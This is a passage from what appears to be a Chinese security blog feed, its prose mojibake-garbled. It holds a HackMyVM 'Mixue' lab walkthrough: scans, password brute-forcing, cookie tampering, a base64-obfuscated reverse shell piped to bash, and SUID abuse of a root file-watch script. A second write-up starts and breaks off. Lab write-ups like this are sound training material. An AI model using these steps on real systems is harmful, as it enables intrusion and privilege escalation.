10:57<br>Completed NSE at 10:57, 0.00s elapsed<br>Initiating NSE at 10:57<br>Completed NSE at 10:57, 0.00s elapsed<br>Initiating ARP Ping Scan at 10:57<br>Scanning 192.168.56.111 [1 port]<br>Completed ARP Ping Scan at 10:57, 0.05s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 10:57<br>Completed Parallel DNS resolution of 1 host. at 10:57, 0.02s elapsed<br>Initiating SYN Stealth Scan at 10:57<br>Scanning 192.168.56.111 [1000 ports]<br>Discovered open port 22/tcp on 192.168.56.111<br>Discovered open port 80/tcp on 192.168.56.111<br>Completed SYN Stealth Scan at 10:57, 0.07s elapsed (1000 total ports)<br>Initiating Service scan at 10:57<br>Scanning 2 services on 192.168.56.111<br>Completed Service scan at 10:58, 6.03s elapsed (2 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.56.111</span><br>NSE: Script scanning 192.168.56.111.<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.23s elapsed<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.01s elapsed<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.00s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00050s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: MIXUE Ice Cream &amp; Tea - Official Site<br>|_http-server-header: Apache/2.4.62 (Debian)<br>| http-methods: <br>|_  Supported Methods: HEAD GET POST OPTIONS<br>MAC Address: 08:00:27:B7:D0:C7 (Oracle VirtualBox virtual NIC)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 25.680 days (since Wed May  7 18:38:39 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=257 (Good luck!)<br>IP ID Sequence Generation: All zeros<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.50 ms 192.168.56.111<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.00s elapsed<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.00s elapsed<br>Initiating NSE at 10:58<br>Completed NSE at 10:58, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.10 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)<br></code></pre></td></tr></table></figure><p>dirsearchï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"> _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/Desktop/reports/_192.168.56.111/_25-06-02_10-59-08.txt<br><br>Target: http://192.168.56.111/<br><br>[10:59:08] Starting:                                                                                                                                       <br>[10:59:09] 403 -  279B  - /.ht_wsr.txt                                      <br>[10:59:09] 403 -  279B  - /.htaccess.orig                                   <br>[10:59:09] 403 -  279B  - /.htaccess.sample<br>[10:59:09] 403 -  279B  - /.htaccess.save<br>[10:59:09] 403 -  279B  - /.htaccess_extra                                  <br>[10:59:09] 403 -  279B  - /.htaccess_orig                                   <br>[10:59:09] 403 -  279B  - /.htaccess_sc<br>[10:59:09] 403 -  279B  - /.htaccessBAK<br>[10:59:09] 403 -  279B  - /.htaccessOLD<br>[10:59:09] 403 -  279B  - /.htaccessOLD2<br>[10:59:09] 403 -  279B  - /.html                                            <br>[10:59:09] 403 -  279B  - /.htm<br>[10:59:09] 403 -  279B  - /.htpasswd_test                                   <br>[10:59:09] 403 -  279B  - /.httr-oauth                                      <br>[10:59:09] 403 -  279B  - /.htpasswds<br>[10:59:10] 403 -  279B  - /.htaccess.bak1                                   <br>[10:59:10] 403 -  279B  - /.php                                             <br>[10:59:18] 302 -    0B  - /dashboard.php  -&gt;  login.php                     <br>[10:59:23] 200 -  832B  - /login.php                                        <br>[10:59:30] 403 -  279B  - /server-status                                    <br>[10:59:30] 403 -  279B  - /server-status/                                   <br>[10:59:35] 301 -  318B  - /uploads  -&gt;  http://192.168.56.111/uploads/      <br>[10:59:35] 200 -  407B  - /uploads/ <br></code></pre></td></tr></table></figure><p>gobusterï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u 192.168.56.111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.111<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,zip,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 279]<br>/index.html           (Status: 200) [Size: 20196]<br>/.html                (Status: 403) [Size: 279]<br>/login.php            (Status: 200) [Size: 2189]<br>/uploads              (Status: 301) [Size: 318] [--&gt; http://192.168.56.111/uploads/]<br>/dashboard.php        (Status: 302) [Size: 0] [--&gt; login.php]<br>/.php                 (Status: 403) [Size: 279]<br>/.html                (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>å¼€æ”¾äº†22å’Œ80ç«¯å£ï¼Œç»å…¸çš„indexï¼Œloginï¼Œdashboardä¸‰ä»¶å¥—ï¼Œè¿˜æœ‰ä¸ªuploadsï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯å¯ä»¥è‡ªå·±ä¼ æ¶æ„æ–‡ä»¶ä¸Šå»çš„ï¼Œåæ¥å‘ç°æƒ³å¤šäº†ã€‚</p><p>è®¿é—®index.htmlï¼Œæ˜¯ä¸ªé™æ€é¡µé¢ï¼Œä»€ä¹ˆä¸œè¥¿éƒ½ä¸èƒ½ç‚¹ï¼Œåº•ä¸‹çš„å‘é€emailè®¢é˜…ä¹Ÿåªæ˜¯ä¸ªæ¶å­ï¼Œæ²¡æ³•çœŸçš„å‘ä¸œè¥¿ã€‚</p><p><img src="/2025/06/02/HackMyVM-Mixue/msedge_7H4HhqpYqr.png"></p><p>å†è®¿é—®&#x2F;uploads&#x2F;ï¼ŒåŒæ ·çš„ç©ºç•Œé¢ï¼Œæ²¡æœ‰ä¸Šä¼ æŒ‰é’®ï¼Œæºç æ²¡ä¸œè¥¿ã€‚</p><p><img src="/2025/06/02/HackMyVM-Mixue/msedge_1oQe7pg8Ml.png"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p>åªèƒ½è®¿é—®loginäº†ï¼Œæ˜¯ä¸ªç»å…¸çš„ç™»å½•ç•Œé¢ï¼Œç”¨adminè¯•è¯•å¸¸è§çš„å­—å…¸ï¼Œæ²¡æœ‰æˆåŠŸã€‚</p><p><img src="/2025/06/02/HackMyVM-Mixue/msedge_JR99D6bdwi.png"></p><p>è¿™æ—¶å€™æˆ‘ä»¬å›çœ‹indexçš„æœ€åº•ä¸‹ï¼Œæœ‰ä¸ªsublargeçš„é‚®ç®±ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™å°±æ˜¯ç½‘ç«™ç®¡ç†å‘˜çš„è´¦æˆ·é‚®ç®±ï¼Œæˆ‘ä»¬æ¢ä¸Šsublargeçš„ç”¨æˆ·åå†çˆ†ç ´ä¸€æ¬¡ï¼Œå¾—åˆ°ä½¿ç”¨äº†å¼±å£ä»¤123456ï¼ŒæˆåŠŸç™»å½•ã€‚</p><p>ï¼ˆå…¶å®è¿™é‡Œä¸å…‰æœ‰adminå’Œsublargeè´¦æˆ·ï¼Œè¿˜æœ‰ä¸€äº›å¼±å£ä»¤æ¯”å¦‚testï¼Œguestè´¦æˆ·ï¼Œä¸è¿‡æƒé™éƒ½æ˜¯wwwdataï¼Œæ²¡æœ‰åŒºåˆ«ï¼‰</p><p><img src="/2025/06/02/HackMyVM-Mixue/msedge_jADNL7YC98.png"></p><p>åˆæç¤ºæˆ‘ä»¬æ²¡æœ‰ç®¡ç†å‘˜æƒé™ï¼ŒæŠ“åŒ…æŸ¥çœ‹ï¼Œå‘ç°ç®¡ç†å‘˜æƒé™æ˜¯é€šè¿‡cookieç®¡ç†çš„ã€‚</p><p><img src="/2025/06/02/HackMyVM-Mixue/cloudmusic_IhiBFmk2dF.png"></p><p>ä¿®æ”¹cookieï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç•Œé¢ï¼Œåå¼¹shellåˆ°æˆ‘ä»¬çš„ä¸»æœºä¸Šã€‚</p><p><img src="/2025/06/02/HackMyVM-Mixue/cloudmusic_ltgAq89VSv.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNDQ0NCAwPiYxKSAm|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_S84Qap74no.png"></p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><hr><p>æ‹¿åˆ°webshellä¹‹åå…ˆçœ‹çœ‹æœ¬åœ°ç›®å½•ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆèƒ½ç”¨çš„ä¸œè¥¿ï¼Œå¯æƒœæ²¡æœ‰ã€‚</p><p>è¿™é‡Œçš„adminå¯†ç æ¯”è¾ƒå¤æ‚ï¼Œæ²¡æ³•é€šè¿‡ä¸€èˆ¬çš„å­—å…¸çˆ†å‡ºæ¥ï¼Œæå¾—æˆ‘ä»¥ä¸ºæ˜¯sshçš„å¯†ç æµªè´¹æŒºå¤šæ—¶é—´çš„ã€‚</p><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_KHM0f4USVO.png"></p><p>å†çœ‹ä¸€ä¸‹&#x2F;homeä¸‹é¢çš„ç”¨æˆ·ï¼Œè¿™é‡Œå·²ç»åˆè§ç«¯å€ªäº†ï¼Œæœ‰ä¸ªç”¨æˆ·ç»„æ˜¯å±äºrootçš„ã€‚</p><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_zcOCN7ZY6t.png"></p><p>çœ‹ä¸€ä¸‹ä»–åä¸‹çš„æ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶æ‹¿åˆ°sublargeçš„sshç™»å½•å¯†ç ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user suraxddq 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_68zlsw62PB.png"></p><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_AtOdFU3jAW.png"></p><p>äº‹å®ä¸Šå¦‚æœæ²¡æœ‰å‘ç°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨grepæš´åŠ›è·å–ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;sublarge&quot;</span> -r -n / 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_06SrqTk8u7.png"></p><p>sshç™»å½•åˆ°sublargeä¸Šè·å–userflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh sublarge@192.168.56.111<br>sublarge@192.168.56.111<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Mixue 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">sublarge@Mixue:~$ ls</span><br><span class="hljs-string">user.txt</span><br><span class="hljs-string">sublarge@Mixue:~$ cat user.txt </span><br><span class="hljs-string">flag&#123;user-88c71208-3bbd-11f0-b2d7-000c2955ba04&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>å›çœ‹ä¹‹å‰suraxddqçš„æ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªkeyï¼Œè¿˜æœ‰ä¸€ä¸ªlogsã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Mixue:/home/suraxddq$ <span class="hljs-built_in">cat</span> key<br>fix me<br>www-data@Mixue:/home/suraxddq$ <span class="hljs-built_in">cat</span> logs<br>root@Mixue:~# <span class="hljs-built_in">cat</span> /etc/systemd/system/key-monitor.service<br>[Unit]<br>Description=Key file monitor<br><br>[Service]<br>ExecStart=/usr/local/bin/monitor_key.sh<br>Restart=always<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¿™ä¸ªlogsæŒ‡å‘ä¸€ä¸ªå«monitor_keyçš„shæ–‡ä»¶ã€‚</p><p>(äº‹å®ä¸Šä¸Šä¼ pspyç­‰è¿›ç¨‹ç›‘è§†å·¥å…·ä¹Ÿå¯ä»¥ç›´æ¥çœ‹åˆ°)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Mixue:/home/suraxddq$ <span class="hljs-built_in">cat</span> /usr/local/bin/monitor_key.sh<br><span class="hljs-comment">#!/bin/bash</span><br>inotifywait -m -e modify,attrib,close_write,move,delete /home/suraxddq/key |<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span>; <span class="hljs-keyword">do</span><br>    /opt/change.sh<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>å½“keyæ–‡ä»¶è¢«ä¿®æ”¹æ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œchange.shæ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Mixue:/home/suraxddq$ <span class="hljs-built_in">cat</span> /opt/change.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br><br><span class="hljs-built_in">chown</span> root:root /tmp/tmpfile 2&gt;/dev/null<br><span class="hljs-built_in">chmod</span> 4755 /tmp/tmpfile 2&gt;/dev/null<br><span class="hljs-built_in">sleep</span> 10<br><span class="hljs-built_in">rm</span> /tmp/tmpfile 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>ç”¨rootæƒé™æ‰§è¡Œ&#x2F;tmp&#x2F;tmpfileæ–‡ä»¶ã€‚</p><p>åˆ©ç”¨é“¾å¾ˆæ¸…æ™°äº†ï¼Œç°åœ¨å”¯ä¸€çš„éš¾ç‚¹åœ¨äºå¦‚ä½•æ‹¿åˆ°ä¿®æ”¹keyï¼Œä¹Ÿå°±æ˜¯suraxddqçš„æƒé™ã€‚</p><p>å¾ˆç®€å•ï¼Œä¸¤ä¸ªç”¨æˆ·å¯†ç ç›¸åŒã€‚ï¼ˆå”‰ï¼‰</p><p>ï¼ˆäº‹å®ä¸Šï¼Œæ‰€æœ‰ç”¨æˆ·åŒ…æ‹¬rootéƒ½æ˜¯è¿™ä¸ªå¯†ç ï¼‰ï¼ˆå”‰å”‰ï¼‰</p><p><img src="/2025/06/02/HackMyVM-Mixue/vmware_yJ01QP8MRl.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tmpfile-5.0# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-8b360934-3bae-11f0-b977-000c2955ba04&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªé¶åœºçš„éš¾åº¦çœŸçš„æ˜¯éå¸¸ç®€å•äº†ï¼Œåƒä¸‡æ³¨æ„ä¿¡æ¯æ”¶é›†å’Œå¯†ç å¤ç”¨ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-translate</title>
    <link href="/2025/05/29/HackMyVM-translate/"/>
    <url>/2025/05/29/HackMyVM-translate/</url>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©ç¾¤é‡Œå‘çš„é¶æœºï¼Œå¾ˆé—æ†¾æ²¡èƒ½åšæˆåŠŸï¼Œç°åœ¨æ¥å¤ç›˜ä¸€ä¸‹ã€‚</p><p>é¶æœºip:192.168.56.108</p><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><hr><p>nmap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.56.108<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-28 23:25 EDT<br>NSE: Loaded 156 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 23:25<br>Completed NSE at 23:25, 0.00s elapsed<br>Initiating NSE at 23:25<br>Completed NSE at 23:25, 0.00s elapsed<br>Initiating NSE at 23:25<br>Completed NSE at 23:25, 0.00s elapsed<br>Initiating ARP Ping Scan at 23:25<br>Scanning 192.168.56.108 [1 port]<br>Completed ARP Ping Scan at 23:25, 0.05s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 23:25<br>Completed Parallel DNS resolution of 1 host. at 23:25, 0.02s elapsed<br>Initiating SYN Stealth Scan at 23:25<br>Scanning 192.168.56.108 [1000 ports]<br>Discovered open port 80/tcp on 192.168.56.108<br>Discovered open port 22/tcp on 192.168.56.108<br>Discovered open port 5001/tcp on 192.168.56.108<br>Completed SYN Stealth Scan at 23:25, 0.06s elapsed (1000 total ports)<br>Initiating Service scan at 23:25<br>Scanning 3 services on 192.168.56.108<br>Completed Service scan at 23:26, 91.31s elapsed (3 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.56.108</span><br>NSE: Script scanning 192.168.56.108.<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.83s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 1.02s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.0012s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT     STATE SERVICE        VERSION<br>22/tcp   open  ssh            OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http           Apache httpd 2.4.62 ((Debian))<br>| http-methods: <br>|_  Supported Methods: OPTIONS HEAD GET POST<br>|_http-title: \xE6\x88\x91\xE7\x9A\x84\xE9\xA1\xB5\xE9\x9D\xA2<br>|_http-server-header: Apache/2.4.62 (Debian)<br>5001/tcp open  commplex-link?<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 405 METHOD NOT ALLOWED<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Thu, 29 May 2025 03:25:35 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Allow: POST, OPTIONS<br>|     Content-Length: 153<br>|     Access-Control-Allow-Origin: *<br>|     Connection: close<br>|     &lt;!doctype html&gt;<br>|     &lt;html lang=en&gt;<br>|     &lt;title&gt;405 Method Not Allowed&lt;/title&gt;<br>|     &lt;h1&gt;Method Not Allowed&lt;/h1&gt;<br>|     &lt;p&gt;The method is not allowed <span class="hljs-keyword">for</span> the requested URL.&lt;/p&gt;<br>|   HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Thu, 29 May 2025 03:25:35 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Allow: POST, OPTIONS<br>|     Access-Control-Allow-Origin: *<br>|     Content-Length: 0<br>|     Connection: close<br>|   Help: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request syntax (<span class="hljs-string">&#x27;HELP&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   RTSPRequest: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error 